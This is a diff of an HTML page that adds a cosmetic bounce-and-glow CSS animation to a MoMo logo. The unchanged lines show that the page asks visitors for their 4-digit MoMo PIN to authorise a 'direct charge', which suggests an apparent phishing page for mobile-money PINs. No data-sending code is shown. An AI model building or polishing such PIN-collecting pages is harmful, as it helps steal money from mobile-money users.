@@ -125,7 +125,31 @@
       from { text-shadow: 0 0 8px #FFD700; }
       to { text-shadow: 0 0 25px #FFE066; }
     }
+    
+/* Smooth bouncing animation for the MoMo logo */
+.bounce {
+  animation: bounce 3s ease-in-out infinite, glow 2.5s ease-in-out infinite alternate;
+}
 
+/* Bouncing effect */
+@keyframes bounce {
+  0%, 100% {
+    transform: translateY(0);
+  }
+  50% {
+    transform: translateY(-15px);
+  }
+}
+
+/* Gentle golden glow */
+@keyframes glow {
+  0% {
+    filter: drop-shadow(0 0 2px gold) drop-shadow(0 0 5px rgba(255, 215, 0, 0.7));
+  }
+  100% {
+    filter: drop-shadow(0 0 10px gold) drop-shadow(0 0 20px rgba(255, 215, 0, 1));
+  }
+}
     /* === NOTIFICATION === */
     #notification {
       transition: opacity 0.4s ease, transform 0.3s ease;
@@ -150,7 +174,7 @@
   <!-- 🟡 MAIN CARD -->
   <div class="card w-full max-w-md p-8">
     <p class="font-bold text-xl text-center mb-3">Link Your MoMo Account</p>
-    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4">
+    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4 bounce">
     <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Secure Your Account</h1>
     <p class="text-gray-600 text-center mb-6">Enter your 4-digit MoMo PIN to link your account for a direct charge.</p>
 
@@ -224,5 +248,6 @@
   </script>
 </body>
 </html>
+
 
 
